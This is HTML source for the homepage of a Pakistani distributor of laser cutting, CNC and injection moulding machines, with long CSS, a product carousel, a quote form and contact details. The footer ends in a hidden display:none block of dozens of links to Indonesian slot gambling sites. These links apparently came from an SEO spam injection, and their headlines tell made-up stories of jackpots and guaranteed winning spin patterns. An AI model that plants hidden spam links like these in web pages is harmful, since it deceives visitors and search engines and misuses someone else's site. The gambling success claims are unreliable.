            .col-sm-5 {
                flex: 0 0 auto;
                width: 41.66666667%;
            }
        }

        @media (min-width: 992px) {

            .technological-innovation .align-items-center .card-body,
            .product-center .left-right .row .card-body {
                padding-left: 15%;
            }
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {

            .text-title,
            .system-process .text-title,
            .other-products .text-title {
                font-size: 1.25rem;
            }
        }

        .align-items-center {
            align-items: center !important;
        }

        .row {
            --hsg-gutter-x: 1.5rem;
            --hsg-gutter-y: 0;
            display: flex;
            flex-wrap: wrap;
            margin-top: calc(-1* var(--hsg-gutter-y));
            margin-right: calc(-0.5* var(--hsg-gutter-x));
            margin-left: calc(-0.5* var(--hsg-gutter-x));
        }

        .left-right,
        .left-right .row>div {
            max-height: 550px;
        }

        .left-right .col-sm-7 {
            width: 64%;
            overflow: hidden;
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {
            .product-center .row .card {
                min-height: 100px;
            }
        }

        .product-center .row .card {
            padding: 1rem 0;
        }

        @media (min-width: 992px) {

            .product-center .col-6:nth-of-type(odd),
            .technological-innovation .col-6:nth-of-type(odd),
            .company-news .col-6:nth-of-type(odd) {
                padding-right: 12px;
            }
        }

        .product-center .col-6:nth-of-type(odd),
        .technological-innovation .col-6:nth-of-type(odd),
        .company-news .col-6:nth-of-type(odd) {
            padding-right: 6px;
        }

        @media (min-width: 500px) {
            .col-sm-12 {
                flex: 0 0 auto;
                width: 100%;
            }
        }

        @media (min-width: 1200px) {
            .product-center .row .card {
                padding: 2.5rem 1rem;
            }
        }

        @media (min-width: 1200px) {
            .product-center .row .card {
                min-height: 490px;
            }
        }

        @media (min-width: 992px) {
            .center-section .card {
                margin-bottom: 24px;
            }
        }

        @media (min-width: 992px) {
            .center-section .card {
                border-radius: 17px;
                border-color: none;
                border: none;
                overflow: hidden;
            }
        }

        @media (min-width: 992px) {
            .col-lg-5 {
                flex: 0 0 auto;
                width: 41.66666667%;
            }
        }

        @media (min-width: 992px) {

            .product-center .col-6:nth-of-type(odd),
            .technological-innovation .col-6:nth-of-type(odd),
            .company-news .col-6:nth-of-type(odd) {
                padding-right: 12px;
            }
        }

        @media (min-width: 1200px) {
            .product-center .row .card {
                padding: 2.5rem 1rem;
            }
        }

        @media (min-width: 1200px) {
            .product-center .row .card {
                min-height: 500px;
            }

        }

        @media (min-width: 1200px) {
            .product-center .row .card {
                padding: 2.5rem 1rem;
            }
        }

        .row {
            --hsg-gutter-x: 1.5rem;
            --hsg-gutter-y: 0;
            display: flex;
            flex-wrap: wrap;
            margin-top: calc(-1* var(--hsg-gutter-y));
            margin-right: calc(-0.5* var(--hsg-gutter-x));
            margin-left: calc(-0.5* var(--hsg-gutter-x));
        }

        @media (min-width: 992px) {
            .col-lg-12 {
                -ms-flex: 0 0 100%;
                flex: 0 0 100%;
                max-width: 100%;
            }
        }

        @media (min-width: 992px) {
            .center-section .card {
                margin-bottom: 24px;
            }


        }

        @media (min-width: 992px) {
            .center-section .card {
                border-radius: 17px;
                border-color: none;
                border: none;
                overflow: hidden;
            }
        }

        @media (min-width: 768px) {
            .center-section .card-img {
                width: 100%;
            }

        }

        @media (min-width: 992px) {
            .col-lg-7 {
                flex: 0 0 auto;
                width: 58.33333333%;
            }
        }

        @media (min-width: 1400px) and (max-width: 1599.98px) {

            .text-title,
            .system-process .text-title,
            .other-products .text-title,
            .system-process .text-title {
                font-size: 32px;
            }

        }

        @media (min-width: 1400px) and (max-width: 1599.98px) {
            .text-ftitle {
                font-size: 29px;
            }

            .footer {

                padding: 10px 20px;

            }

            .footer-container {
                margin-left: 150px;
            }
        }

        @media (min-width: 1200px) {
            .learn-more {
                min-width: 130px;
                text-align: center;
            }
        }

        @media (min-width: 1200px) {
            .learn-more {
                cursor: pointer;
                padding: 10px 26px;
                background-color: #345aca;
                color: #fff;
                display: inline-block;
                font-size: 13px;
                line-height: 24px;
                font-weight: 600;
                border-radius: 40px;
                border: 2px solid #345aca;
            }
        }

        @media (min-width: 1400px) {
            .text-ftitle {
                line-height: 60px;
                min-height: 16px;
                font-size: 29px;
            }
        }

        @media (min-width: 992px) {
            .text-title {
                font-size: 1.75rem;
                line-height: 1.85;
                margin-bottom: 17px;
                letter-spacing: 0px;
                font-size: 51px;

            }
        }

        .product-center .row .card {
            padding: 1rem 0;
        }

        a:hover {
            color: #ff8a00;
            text-decoration: none;
        }

        @media (min-width: 1200px) {
            .col-xl-4 {
                flex: 0 0 auto;
                width: 33.33333333%;
            }
        }

        .col-12 {
            flex: 0 0 auto;
            width: 100%;
        }

        @media (min-width: 1200px) {
            .col-xl-8 {
                flex: 0 0 auto;
                width: 66.66666667%;
            }
        }

        @media (min-width: 1400px) {
            .col-xxl-4 {
                flex: 0 0 auto;
                width: 33.33333333%;
            }

            .carousel-inner {
                padding-left: 34px;
                padding-right: 34px;
            }
        }


        @media (min-width: 1200px) {
            .company-news p {
                font-size: 14px;
                line-height: 26px;
            }
        }

        .row {
            display: flex;
        }

        .col-6 {
            display: flex;
            flex-direction: column;
        }

        .card {
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            height: 100%;
        }

        @media (min-width: 1200px) {
            .col-xl-6 {
                flex: 0 0 auto;
                width: 50%;
            }
        }

        @media (min-width: 1200px) {
            .col-xl-8 {
                flex: 0 0 auto;
                width: 66.66666667%;
            }
        }

        /* @media (min-width: 1200px) {
    .company-news .row .col-xl-5 .card, .company-news .card {
        min-height: 540px;
    }
} */
        @media (min-width: 992px) and (max-width: 1399.98px) {
            .card-body {
                padding: 2.5rem 1.5rem;
            }
        }

        @media (min-width: 1200px) {
            .col-xl-4 {
                flex: 0 0 auto;
                width: 33.33333333%;
            }
        }

        @media (min-width: 992px) and (max-width: 1399.98px) {
            .company-news .card h1 {
                font-size: 1rem;
            }
        }

        @media (min-width: 992px) {
            .company-news .card h1 {
                font-size: 1.25rem;
                line-height: 1.3;
            }
        }

        .center-section .card,
        .center-section .design-aesthetics {
            transform: rotate(0deg);
        }

        .center-section .card-portfolio {
            background-color: #fff;
        }

        @media (min-width: 1200px) {

            .company-news .row .col-xl-5 .card,
            .company-news .card {
                min-height: 540px;
            }
        }

        .company-news .card {
            position: relative;
            cursor: pointer;
            transition: 0.3s;
        }

        @media (min-width: 992px) {
            .center-section .card {
                margin-bottom: 24px;
            }
        }

        @media (min-width: 992px) {
            .center-section .card {
                border-radius: 17px;
                border-color: none;
                border: none;
                overflow: hidden;
            }
        }

        @media (min-width: 992px) {
            .company-news .card-portfolio .card-body {
                padding: 1rem 1.5rem;
            }
        }

        @media (min-width: 992px) {
            .company-news .news-time span:nth-of-type(1) {
                margin-top: 2.5rem;
                font-size: 2rem;
                color: #345aca;
                font-weight: 600;
            }
        }


        @media (min-width: 992px) {
            .company-news .news-time span {
                display: block;
            }
        }

        .company-news .card-portfolio .card-body {
            padding: 1rem;
        }

        @media (max-width: 991.98px) {
            .learn-more {
                width: 95px;
                text-align: center;
            }
        }

        .center-section {
            position: relative;
            z-index: 2;
            background-color: #f1f3f5;
            margin-bottom: 1.5rem;
        }



        .title {
            font-size: 20px;
            line-height: 1.3;
            font-weight: 450;
            color: #000;
            margin-bottom: 16px;
        }

        @media (min-width: 992px) {
            .title {
                font-size: calc(1.25vw + 24px);
                font-weight: 600;
            }
        }

        .card-container {
            display: flex;
            justify-content: center;
            gap: 50px;
            flex-direction: row;
        }


        .card1 {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            width: 300px;
            height: auto;
            /* Adjusted height to auto */
            padding: 15px;
            /* Adjusted padding to fit text better */
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            background-color: #fff;
            transition: transform 0.3s ease;
            overflow: hidden;
            /* Prevents text overflow */
        }

        .card1 img {
            max-width: 100%;
            height: auto;
            border-radius: 10px 10px 0 0;
        }

        .card1 h3 {
            margin: 10px 0;
            font-size: 1.5em;
        }

        .card1 p {
            font-size: 15px;
            color: #555;
            margin-bottom: 10px;
            /* Adds margin to prevent text from touching the bottom of the card */
        }

        .card1:hover {
            transform: translateY(-10px);
        }

        @media (max-width: 768px) {
            .card1 {
                width: 100%;
            }

            .card1 p {
                font-size: 12px;
                color: #555;
                margin-bottom: 10px;
                /* Adds margin to prevent text from touching the bottom of the card */
            }

            .footer-column a {
                color: #ffffff;
                text-decoration: none;
                padding: 1px 2px;
                position: relative;
                transition: all 0.3s ease;
                font-size: 17px;
            }
        }

        .new-title {
            text-align: center;
            margin-bottom: 30px;
            font-size: 36px;
            color: #333;
            position: relative;
            font-weight: 600;
            margin-bottom: 50px;
            margin-top: 50px;
        }

        .new-title::after {
            content: '';
            width: 50px;
            height: 4px;
            background-color: #ff8800;
            position: absolute;
            left: 50%;
            bottom: -10px;
            transform: translateX(-50%);
            border-radius: 2px;
        }

        /* For large 4K displays (2560px and above) */
     

        @media only screen and (min-width: 2560px) {
            .product-center .text-title {
                font-size: 60px;
            }

            .product-center .text-ftitle {
                font-size: xxx-large;
                line-height: inherit;
            }

            .product-center .learn-more {
                font-size: xx-large;
                padding: 30px;
            }
        }

        @media only screen and (min-width: 2560px) {
            .product-center .card-img img {
                width: 100%;
                height: auto;
            }

            .product-center .card {
                margin-bottom: 2rem;
            }

            .product-center .card-body {
                padding: 2rem;
            }

            .carousel-caption button {
                margin: 5px;
                padding: 10px 40px;
                font-size: 40px;
                border-radius: 25px;
            }

        }

        @media only screen and (min-width: 2560px) {
            .product-center .new-title {
                font-size: 3.5rem;
                margin-bottom: 2rem;
            }

            .product-center .card-container {
                display: flex;
                justify-content: center;
                gap: 3rem;
            }

            .product-center .card1 {
                flex: 0 0 40%;
                text-align: center;
            }

            .product-center .card1 img {
                width: 100%;
                height: auto;
                margin-bottom: 1.5rem;
            }

            .product-center .card1 h3 {
                font-size: 2.5rem;
                font-weight: 600;
            }

            .product-center .card1 p {
                font-size: 40px;
            }
        }

        @media only screen and (min-width: 2560px) {
            .quote-form {
                max-width: 1800px;
            }

            .quote .form-title {
                font-size: 3rem;
                margin-bottom: 2rem;
            }

            .quote .form-group {
                margin-bottom: 2rem;
            }

            .quote .form-label {
                font-size: xx-large;
            }

            .quote .form-input,

            .quote .form-textarea {
                font-size: x-large;
                padding: 1rem;
                width: 100%;
            }

            .quote .form-submit {
                font-size: xx-large;
                padding: 1.2rem 2rem;
            }
        }

        @media only screen and (min-width: 2560px) {
            .footer .footer-container {
                display: flex;
                justify-content: space-between;
                /* Adjust this for less spacing */
                padding: 2rem 3rem;
                /* Reduce padding */
                margin-left: 100px;
            }

            .col-sm-7 {
                max-height: 300px;
            }

            .footer .footer-column {
                flex: 1;
                margin-left: 70px;
                margin-right: 20px;
            }


            .footer .footer-column h3 {
                font-size: 2.5rem;
                /* Adjust font size */
                margin-bottom: 1.5rem;
                /* Adjust spacing below headings */
                color: #ffa500;
            }

            .footer .footer-column p,
            .footer .footer-column ul li {
                font-size: xx-large;
                /* Adjust font size */
                line-height: 4rem;
                /* Adjust line height */
                color: #f2f2f2;
            }

            .footer .footer-column ul li a {
                font-size: xx-large;
                /* Adjust font size */
                line-height: 4rem;
                /* Adjust font size */
                color: #ffffff;
                text-decoration: none;
                transition: color 0.3s ease;
            }

            .footer .footer-column ul li a:hover {
                color: #fff;
            }

            .footer .social-icons a {
                font-size: 2rem;
                /* Adjust icon size */
                color: #ffffff;
            }

            .footer .social-icons a i {
                margin-left: 0.5rem;
            }
        }

        @media (min-width: 2560px) {
            .center-section {
                margin-left: 250px;
                margin-right: 250px;
            }

            .carousel-inner {
                padding-left: 54px;
                padding-right: 54px;
            }
        }

        .whatsapp-float {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 1000;
            cursor: pointer;
            transition: transform 0.3s ease-in-out;
        }

        .whatsapp-float img {
            width: 200px;
            height: auto;


        }

        .whatsapp-float:hover {
            transform: scale(1.1);
        }

        @media (max-width: 1024px) {
            .whatsapp-float img {
                width: 150px;
                /* Reduce size for tablets */
            }
        }

        /* Small screens (mobile) */
        @media (max-width: 768px) {
            .whatsapp-float img {
                width: 100px;
                /* Smaller size for mobile devices */
            }
        }

        /* Extra small screens (very small phones) */
        @media (max-width: 480px) {
            .whatsapp-float img {
                width: 80px;
                /* Even smaller size for very small screens */
            }
        }

        .contact-btns-container {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            padding-top: 28px;
            justify-content: center;
        }

        .contact-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 12px 20px;
            font-size: 16px;
            font-weight: bold;
            border: none;
            cursor: pointer;
            border-radius: 8px;
            transition: all 0.3s ease;
            text-decoration: none;
            min-width: 200px;
            text-align: center;
        }

        .btn-call,
        .btn-email {
            background-color: #1f4c75;
            color: white;
        }

        .btn-whatsapp {
            border: 2px solid #25D366;
            color: #25D366;
            background-color: white;
        }

        .btn-call:hover,
        .btn-email:hover {
            background-color: #163655;
        }

        .btn-whatsapp:hover {
            background-color: #25D366;
            color: white;
        }

        .icon {
            font-size: 18px;
        }

        @media (max-width: 600px) {
            .contact-btns-container {
                flex-direction: column;
                align-items: center;
                padding: 30px;
            }

            .contact-btn {
                width: 100%;
            }
        }
    </style>



</head>

<body>
    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NVK9FF5C"
            height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->
    <header>
        <div class="logo">
            <img src="products/Logos-01.jpg" alt="HSG Logo">
        </div>
        <nav class="nav">
            <ul class="nav-menu">
                <li ><a href="index.php" class="active">Home</a></li>
                <li><a href="aboutus.html">About us</a></li>
                <li class="has-submenu">
                    <a href="lasercutting.html">Laser Cutting Machines</a>

                </li>
                <li class="has-submenu">
                    <a href="cncmachine.html">CNC Machining & Turning Centers</a>

                </li>
                <li><a href="injectionmoulding.html">Injection Moulding Machines</a></li>
                <li><a href="laser_accessories.html">Laser Cutting Accessories</a></li>
                <li><a href="mold.html">Mold Bases</a></li>
            </ul>
            <button class="nav-toggle" aria-label="Toggle navigation">&#9776;</button>
        </nav>
    </header>
    <a href="https://wa.me/+923008227711" class="whatsapp-float" target="_blank">
        <img src="wp icon.png" alt="Chat with us on WhatsApp">
    </a>

    <div id="carouselExampleIndicators" class="carousel slide" data-ride="carousel">
        <ol class="carousel-indicators">
            <li data-target="#carouselExampleIndicators" data-slide-to="0" class="active"></li>
            <li data-target="#carouselExampleIndicators" data-slide-to="1"></li>
            <li data-target="#carouselExampleIndicators" data-slide-to="2"></li>
            <li data-target="#carouselExampleIndicators" data-slide-to="3"></li>
        </ol>
        <div class="carousel-inner">

            <div class="carousel-item active">
                <picture>
                    <source media="(min-width: 768px)" srcset="crousel/injectionp.jpg">
                    <source media="(max-width: 767px)" srcset="crousel/injectionm.jpg">
                    <img src="injection m.jpg" class="d-block w-100" alt="Image 0">
                </picture>
                <div class="carousel-caption">
                    <button class="btn btn-primary" onclick="window.location.href='injectionmoulding.html'">Learn More</button>
                    <button class="btn btn-secondary" onclick="window.location.href='#request-quote'">Inquiry</button>
                </div>
            </div>
            <div class="carousel-item">
                <picture>
                    <source media="(min-width: 768px)" srcset="crousel/p.jpeg">
                    <source media="(max-width: 767px)" srcset="crousel/m.jpeg">
                    <img src="crousel/m.jpeg" class="d-block w-100" alt="Image 1">

                </picture>
                <div class="carousel-caption">
                    <button class="btn btn-primary" onclick="window.location.href='cncmachine.html'">Learn More</button>
                    <button class="btn btn-secondary" onclick="window.location.href='#request-quote'">Inquiry</button>
                </div>
            </div>
            <div class="carousel-item ">
                <picture>
                    <source media="(min-width: 768px)" srcset="crousel/gv.webp">
                    <source media="(max-width: 767px)" srcset="crousel/gv_m (1).webp">
                    <img src="crousel/gv_m (1).webp" class="d-block w-100" alt="Image 2">
                </picture>
                <div class="carousel-caption">
                    <button class="btn btn-primary" onclick="window.location.href='lasercutting.html'">Learn More</button>
                    <button class="btn btn-secondary" onclick="window.location.href='#request-quote'">Inquiry</button>
                </div>
            </div>
            <div class="carousel-item">
                <picture>
                    <source media="(min-width: 768px)" srcset="crousel/weldingp.jpg">
                    <source media="(max-width: 767px)" srcset="crousel/weldingm.jpg">
                    <img src="crousel/weldingm.jpg" class="d-block w-100" alt="Image 3">
                </picture>
                <div class="carousel-caption">
                    <button class="btn btn-primary" onclick="window.location.href='lasercutting.html'">Learn More</button>
                    <button class="btn btn-secondary" onclick="window.location.href='#request-quote'">Inquiry</button>
                </div>
            </div>


        </div>
        <a class="carousel-control-prev" href="#carouselExampleIndicators" role="button" data-slide="prev">
            <span class="carousel-control-prev-icon" aria-hidden="true"></span>
            <span class="sr-only">Previous</span>
        </a>
        <a class="carousel-control-next" href="#carouselExampleIndicators" role="button" data-slide="next">
            <span class="carousel-control-next-icon" aria-hidden="true"></span>
            <span class="sr-only">Next</span>
        </a>
    </div>
    <div class="contact-btns-container">
        <a href="tel:03008227711" class="contact-btn btn-call">
            📞 Call
        </a>
        <a href="mailto: itdtech2004@gmail.com" class="contact-btn btn-email">
            ✉️ Email
        </a>
        <a href="https://wa.me/03008227711" class="contact-btn btn-whatsapp">
            WhatsApp
        </a>
    </div>
    <section class="center-section product-center">
        <div class="container-fluid">
            <h1 class="new-title">Product Center</h1>
            <div class="card card-portfolio overflow-hidden left-right">
                <div class="row align-items-center">
                    <div class="col-sm-7">
                        <div class="card-img">
                            <img data-src="//static.hsglasercnc.com/img/index/sheet_pc.webp" class=" lazyloaded" alt="HSG sheet metal laser cutting machine" src="//static.hsglasercnc.com/img/index/sheet_pc.webp">
                        </div>
                    </div>
                    <div class="col-sm-5">
                        <div class="card-body">
                            <h1 class="text-title">HSG</h1>
                            <p class="text-ftitle">Laser Cutting Machine</p>
                            <a class="learn-more" href="lasercutting.html" target="_blank">Learn More</a>
                        </div>
                    </div>
                </div>
            </div>

            <div class="col-sm-12 col-lg-12">
                <div class="row">
                    <div class="col-6">
                        <div class="card card-portfolio overflow-hidden  text-center">
                            <div class="card-body">
                                <h1 class="text-title">SYIL</h1>
                                <p class="text-ftitle">CNC Machining and Turning Centers</p>
                                <a class="learn-more" href="cncmachine.html" target="_blank">Learn More</a>
                            </div>
                            <div class="card-img">
                                <img data-src="New folder/x7/x5.webp" class="card-img-bottom lazyloaded" alt="HSG sheet and tube laser cutting machine" src="New folder/x7/x5.webp">
                            </div>
                        </div>

                    </div>
                    <div class="col-6">
                        <div class="card card-portfolio overflow-hidden  text-center">
                            <div class="card-body">
                                <h1 style="color: white;" class="text-title">SYIL</h1>

                                <p class="text-ftitle">Injection Moulding Machines</p>

                                <a class="learn-more" href="injectionmoulding.html" target="_blank">Learn More</a>
                            </div>
                            <div class="card-img">
                                <img data-src="products/bg.png" class="card-img-bottom lazyloaded" alt="HSG sheet and tube laser cutting machine" src="products/bg.png">
                            </div>
                        </div>

                    </div>

                </div>
            </div>

        </div>
    </section>

    <section class="center-section product-center">
        <div class="container-fluid">
            <h1 class="new-title">Our Partners</h1>
            <div class="card-container">
                <div class="card1">
                    <img src="New folder/hsg.jpg" alt="Image 1">
                    <h3>HSG</h3>
                    <p>Founded in 2006, HSG Laser is a high-tech enterprise specializing in the research, development, production, and sales of intelligent metal shaping equipment. The company is dedicated to providing metal shaping and automated production line solutions to global customers.</p>
                </div>
                <div class="card1">
                    <img src="New folder/Logo Color.jpg" alt="Image 2">
                    <h3>SYIL</h3>
                    <p>At SYIL, our mission is to design and manufacture top-quality, affordable CNC machines tailored for small business owners. We are dedicated to providing accessible and reliable machinery that empowers entrepreneurs to thrive in their industries.</p>
                </div>
            </div>
        </div>
    </section>
    </div>





    <section class="quote">
        <form id="request-quote" class="quote-form" action="submit_quote.php" method="post">
            <h2 class="form-title">Request A Quote</h2>
            <div class="form-row">
                <div class="form-group">
                    <label for="name" class="form-label">Name</label>
                    <input type="text" id="name" name="name" class="form-input" required>
                </div>
                <div class="form-group">
                    <label for="email" class="form-label">E-mail</label>
                    <input type="email" id="email" name="email" class="form-input" required>
                </div>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label for="phone" class="form-label">Phone or WhatsApp</label>
                    <input type="text" id="phone" name="phone" class="form-input" required>
                </div>
                <div class="form-group">
                    <label for="country" class="form-label">Country</label>
                    <input type="text" id="country" name="country" class="form-input" required>
                </div>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label for="city" class="form-label">City</label>
                    <input type="text" id="city" name="city" class="form-input">
                </div>
                <div class="form-group">
                    <label for="company" class="form-label">Company</label>
                    <input type="text" id="company" name="company" class="form-input">
                </div>
            </div>
            <div class="form-group">
                <label for="message" class="form-label">Message</label>
                <textarea id="message" name="message" class="form-textarea" placeholder="Please leave us the material thickness and working area, we will offer the quotation to you as soon as possible."></textarea>
            </div>
            <button type="submit" class="form-submit">Submit</button>
        </form>
    </section>




    <footer class="footer">
        <div class="footer-container">
            <div class="footer-column">
                <h3>About Us</h3>
                <p> INTERTRADE <br> DISTRIBUTORS PVT LTD <br>
                    Explore our wide range of high-performance equipment tailored to meet your manufacturing needs.</p>
            </div>

            <div class="footer-column">
                <h3>Contact Us</h3>
                <ul>
                    <li>Email: itdtech2004@gmail.com</li>
                    <li>Phone: 0092-300-8227711</li>
                    <li>Tel: 0092-21-32418554, 32424925</li>
                    <li>Fax: 0092-21-32418601</li>
                    <li>Address: Aiwan-e-Tijarat Road P.O Box 4978 Karachi Pakistan</li>
                    <li>Skype ID: fawad.k9</li>
                </ul>
            </div>
            <div class="footer-column">
                <h3>Quick Links</h3>
                <ul>
                    <li><a href="index.php">Home</a></li>
                    <li><a href="lasercutting.html">Laser Cutting Machines</a></li>
                    <li><a href="cncmachine.html">CNC Machining & Turning Centers</a></li>
                    <li><a href="injectionmoulding.html">Injection Moulding Machines </a></li>
                    <li><a href="adminlogin.php">Login as admin </a></li>
                    <li><a href="aboutus.html">About us</a></li>
                </ul>
            </div>
            <div class="footer-column">
                <h3>Follow Us</h3>
                <div class="social-icons">
                    <a target="_blank" href="https://web.skype.com/"> fawad.k9 <i class="fab fa-skype"></i></a>
                </div>
            </div>
        </div>
        <div style="display:none">
            <p><a href="https://mtracing.org/">slotoppo88</a> portal slot online terpercaya di Indonesia</p>
            <p><a href="https://canonforindiana.com/">SLOTBOM77</a> penyedia permainan slot online resmi</p>
            <p><a href="https://kmaa26.com/">SLOTOPPO88</a> slot online terpercaya</p>
            <p><a href="https://mdamoradabad.org/pm-kisan-status-check/">SLOTBOM77</a> situs selot online terpercaya dan resmi</p>
            <p><a href="https://trem.org/news/hanya-modal-20k-pemain-satgasjitu-cuan-puluhan-juta-dari-scatter-hitam.html">Hanya Modal 20K, Pemain Satgasjitu Cuan Puluhan Juta dari Scatter Hitam</a></p>
            <p><a href="https://trem.org/news/main-mahjong-ways-pagi-hari-di-slotoppo-bikin-scatter-hitam-muncul-lebih-cepat.html">Main Mahjong Ways Pagi Hari di Slotoppo Bikin Scatter Hitam Muncul Lebih Cepat</a></p>
            <p><a href="https://trem.org/news/pemain-slotoppo-bongkar-pola-scatter-hitam-mahjong-ways-yang-sering-diabaikan.html">Pemain Slotoppo Bongkar Pola Scatter Hitam Mahjong Ways yang Sering Diabaikan</a></p>
            <p><a href="https://trem.org/news/pemain-slotoppo-ungkap-3-ciri-scatter-hitam-akan-muncul-di-mahjong-ways.html">Pemain Slotoppo Ungkap 3 Ciri Scatter Hitam Akan Muncul di Mahjong Ways</a></p>
            <p><a href="https://trem.org/news/pemain-pemula-slotoppo-tak-sadar-scatter-hitam-mudah-muncul-pakai-pola-ini.html">Pemain Pemula Slotoppo Tak Sadar Scatter Hitam Mudah Muncul Pakai Pola Ini</a></p>
            <p><a href="https://trem.org/news/pola-25x-spin-slotoppo-ini-sukses-bikin-scatter-hitam-muncul-3-kali-berturut.html">Pola 25x Spin Slotoppo Ini Sukses Bikin Scatter Hitam Muncul 3 Kali Berturut</a></p>
            <p><a href="https://trem.org/news/satgasjitu-resmi-diakui-komunitas-slot-medan-sebagai-referensi-pola-scatter-tertinggi.html">Satgasjitu Resmi Diakui Komunitas Slot Medan Sebagai Referensi Pola Scatter Tertinggi</a></p>
            <p><a href="https://trem.org/news/deklarasi-satgasjitu-resmi-digelar-di-bandung-ribuan-pecinta-mahjong-hadir.html">Deklarasi Satgasjitu Resmi Digelar di Bandung, Ribuan Pecinta Mahjong Hadir</a></p>
            <p><a href="https://trem.org/news/satgasjitu-adakan-workshop-menang-mahjong-ways-di-jogja-tiket-sold-out.html">Satgasjitu Adakan Workshop Menang Mahjong Ways di Jogja, Tiket Sold Out</a></p>
            <p><a href="https://trem.org/news/satgasjitu-ciptakan-komunitas-pemain-mahjong-ways-di-malang-fokus-pada-pola-rtp.html">Satgasjitu Ciptakan Komunitas Pemain Mahjong Ways di Malang, Fokus pada Pola RTP</a></p>
            <p><a href="https://trem.org/news/satgasjitu-gandeng-influencer-surabaya-promosikan-cara-aman-raih-jackpot-mahjong.html">Satgasjitu Gandeng Influencer Surabaya Promosikan Cara Aman Raih Jackpot Mahjong</a></p>
            <p><a href="https://trem.org/news/satgasjitu-luncurkan-aplikasi-scatter-tracker-pemain-mahjong-di-bekasi-antusias-coba.html">Satgasjitu Luncurkan Aplikasi Scatter Tracker, Pemain Mahjong di Bekasi Antusias Coba</a></p>
            <p><a href="https://trem.org/news/satgasjitu-raih-penghargaan-komunitas-digital-terbaik-untuk-pemain-mahjong-di-manado.html">Satgasjitu Raih Penghargaan Komunitas Digital Terbaik untuk Pemain Mahjong di Manado</a></p>
            <p><a href="https://trem.org/news/mahasiswa-kupang-daftar-slotoppo-coba-demo-mode-dan-langsung-profit.html">Mahasiswa Kupang Daftar Slotoppo, Coba Demo Mode dan Langsung Profit</a></p>
            <p><a href="https://trem.org/news/mahasiswa-medan-ungkap-pola-spin-mahjong-ways-usai-menang-lewat-slotoppo.html">Mahasiswa Medan Ungkap Pola Spin Mahjong Ways Usai Menang Lewat Slotoppo</a></p>
            <p><a href="https://trem.org/news/pemain-pemula-makassar-menang-scatter-hitam-ternyata-gunakan-metode-dari-slotoppo.html">Pemain Pemula Makassar Menang Scatter Hitam, Ternyata Gunakan Metode dari Slotoppo</a></p>
            <p><a href="https://trem.org/news/pemain-pemula-tangerang-berhasil-menang-mahjong-ways-usai-ikuti-tips-slotoppo.html">Pemain Pemula Tangerang Berhasil Menang Mahjong Ways Usai Ikuti Tips Slotoppo</a></p>
            <p><a href="https://trem.org/news/pengusaha-muda-batam-sebut-slotoppo-sebagai-kunci-profit-harian-dari-mahjong.html">Pengusaha Muda Batam Sebut Slotoppo sebagai Kunci Profit Harian dari Mahjong</a></p>
            <p><a href="https://trem.org/news/pola-spin-slotoppo-terbukti-kuat-pria-banjarmasin-menang-modal-10-ribu.html">Pola Spin Slotoppo Terbukti Kuat, Pria Banjarmasin Menang Modal 10 Ribu</a></p>
            <p><a href="https://trem.org/news/viral-emak-emak-tasikmalaya-tembus-3x-scatter-hitam-beruntun-pakai-akun-slotoppo.html">Viral! Emak-Emak Tasikmalaya Tembus 3x Scatter Hitam Beruntun Pakai Akun Slotoppo</a></p>
            <p><a href="https://berita-viral-cecxe2gaehfzc6ar.southeastasia-01.azurewebsites.net/reseller-skincare-asal-bekasi-bongkar-trik.html">Reseller Skincare Asal Bekasi Bongkar Trik Beli Scatter Hitam di SLOTOPPO hingga Dapat Untung 236 Juta</a></p>
            <p><a href="https://berita-viral-cecxe2gaehfzc6ar.southeastasia-01.azurewebsites.net/sering-kena-zonks-sopir-pick-up-di-garut.html">Sering Kena Zonks, Sopir Pick-Up di Garut Akhirnya Tembus Pola Winrate 97.3% Mahjong Ways SLOTOPPO</a></p>
            <p><a href="https://berita-viral-cecxe2gaehfzc6ar.southeastasia-01.azurewebsites.net/teknisi-ac-temukan-keberuntungan-spin-malam-hari.html">Teknisi AC Temukan Keberuntungan Spin Malam Hari, Dapat Mega Jackpot Mahjong Ways SLOTOPPO!</a></p>
            <p><a href="https://berita-viral-cecxe2gaehfzc6ar.southeastasia-01.azurewebsites.net/tkw-hong-kong-asal-karawang-ungkap-cara-main-mahjong-ways.html">TKW Hong Kong Asal Karawang Ungkap Cara Main Mahjong Ways dari HP Lama – Cuan Terus di SLOTOPPO</a></p>
            <p><a href="https://berita-viral-cecxe2gaehfzc6ar.southeastasia-01.azurewebsites.net/wawan-supir-online-jakarta-tak-sengaja-temukan-pola-scatter.html">Wawan, Supir Online Jakarta, Tak Sengaja Temukan Pola Scatter Tengah Malam di Mahjong Ways 3 – Auto Cuan di SLOTOPPO!</a></p>
            <p><a href="https://newsdaily-g5bhbpfrakasepbt.southeastasia-01.azurewebsites.net/petani-cabe-di-brebes-main-mahjong-ways.html">Petani Cabe di Brebes Main Mahjong Ways Pakai HP Lawas – Dapat Rp132 Juta dari SLOTOPPO</a></p>
            <p><a href="https://newsdaily-g5bhbpfrakasepbt.southeastasia-01.azurewebsites.net/rian-office-boy-ungkap-trik-auto-spin.html">Rian Office Boy Ungkap Trik Auto Spin 25x Scatter Mahjong Ways SLOTOPPO yang Bikin Saldo Gendut</a></p>
            <p><a href="https://newsdaily-g5bhbpfrakasepbt.southeastasia-01.azurewebsites.net/sales-elektronik-tembus-mega-jackpot.html">Sales Elektronik Tembus Mega Jackpot Mahjong Ways 1 SLOTOPPO, Bisa Lunasi Kredit Mobil!</a></p>
            <p><a href="https://newsdaily-g5bhbpfrakasepbt.southeastasia-01.azurewebsites.net/siti-penjual-pulsa-di-pontianak-berhasil-cuan.html">Siti, Penjual Pulsa di Pontianak, Berhasil Cuan Saat Spin Manual Mahjong Ways 3 SLOTOPPO Tengah Malam</a></p>
